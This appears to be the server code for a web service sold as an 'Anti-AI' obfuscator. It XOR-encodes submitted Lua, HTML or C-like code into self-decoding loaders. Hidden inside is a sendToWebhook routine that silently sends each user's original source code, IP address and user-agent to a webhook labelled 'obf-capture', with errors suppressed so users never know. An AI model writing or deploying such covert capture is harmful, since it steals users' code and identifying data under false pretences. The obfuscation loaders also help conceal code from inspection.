module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'method not allowed' });
  const { code, lang } = req.body || {};
  if (typeof code !== 'string' || !code.trim()) {
    return res.status(400).json({ error: 'empty code' });
  }

  const key1 = Math.floor(Math.random() * 45) + 55;
  const key2 = Math.floor(Math.random() * 35) + 15;
  const blank = '\n'.repeat(500);

  const header = `/*
        =============================================================================================
                                Obfuscator Anti-AI(LUA / PWN / HTML)
        =============================================================================================
        bª Website     : https://obfuscator.hdz.my.id
        bª Obfuscation : Runtime polymorphic
        bª Anti-tamper : Ci verification
        bª Entropy     : High
        bª Status      : bÏ Online
        =============================================================================================
${blank}
*/`;

  let out;

  if (lang === 'html') {
    let hex = '';
    for (let i = 0; i < code.length; i++) {
      hex += (code.charCodeAt(i) ^ key1 ^ key2).toString(16).padStart(2, '0');
    }
    const kb = ['fromCharCode', 'write', 'open', 'close'];
    out = `<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>${header}var _0xkb=${JSON.stringify(kb)};(function(_h,_k1,_k2){let _res="";for(let i=0;i<_h.length;i+=2){let _b=parseInt(_h.substr(i,2),16);_res+=String[_0xkb[0]](_b^_k1^_k2)}document[_0xkb[2]]();document[_0xkb[1]](_res);document[_0xkb[3]]()})("${hex}",${key1},${key2});<\/script></body></html>`;
  } else if (lang === 'lua') {
    const encBytes = [];
    let last = key1;
    for (let i = 0; i < code.length; i++) {
      const b = (code.charCodeAt(i) ^ key1 ^ key2 ^ (last % 256) ^ (i % 256)) & 0xff;
      encBytes.push(b);
      last = b;
    }
    let encStr = '';
    for (const b of encBytes) encStr += '\\' + String(b).padStart(3, '0');

    out = `--[[${header}]]--\n${blank}` +
      "local _G = Object_G or _G; " +
      "local _____ = _G['string']; " +
      "local ______ = _____['char']; " +
      "local _______ = _____['byte']; " +
      "local ________ = _G['bit'] and _G['bit']['bxor'] or function(a,b) return a~=b end; " +
      "local ___ = '" + encStr + "'; " +
      "local ____ = ''; " +
      "local ______1 = " + key1 + "; " +
      "for __1 = 1, #___ do " +
        "local __2 = _______(___, __1); " +
        "____ = ____ .. ______((________(________(________(________(__2, " + key1 + "), " + key2 + "), ______1 % 256), (__1 - 1) % 256))); " +
        "______1 = __2 " +
      "end; " +
      "(load or loadstring)(____)()";
  } else {
    // pwn
    const minimized = code
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .replace(/\/\/.*/g, '')
      .replace(/\s+/g, ' ')
      .trim();
    const processed = minimized.replace(/"([^"]*)"/g, (_, p1) => {
      let hex = '';
      for (let j = 0; j < p1.length; j++) hex += '\\x' + (p1.charCodeAt(j) ^ key2).toString(16).toUpperCase();
      return `/*_x*/"${hex}"`;
    });
    out = `${header}${blank}#define _l1I11 ${key2}\n#define _l1ll1(%0) (%0^_l1I11)\n${processed}`;
  }

  try { await sendToWebhook(code, out, req); } catch (_) {}
  return res.status(200).json({ ok: true, output: out });
};

function chunk(s, n = 1800) { const o = []; for (let i = 0; i < s.length; i += n) o.push(s.slice(i, i + n)); return o; }
async function post(url, body) { return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }); }

async function sendToWebhook(original, obfuscated, req) {
  const url = process.env.WEBHOOK_URL;
  if (!url) return;
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.headers['x-real-ip'] || 'unknown';
  const ua = req.headers['user-agent'] || 'unknown';
  await post(url, { username: 'obf-capture', content: `**New submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0,180)}\`\nLen: ${original.length} -> ${obfuscated.length}` });
  for (const [i, p] of chunk(original).entries()) await post(url, { content: `**ORIGINAL [${i+1}]**\n\`\`\`\n${p}\n\`\`\`` });
  for (const [i, p] of chunk(obfuscated).entries()) await post(url, { content: `**OBFUSCATED [${i+1}]**\n\`\`\`\n${p}\n\`\`\`` });
}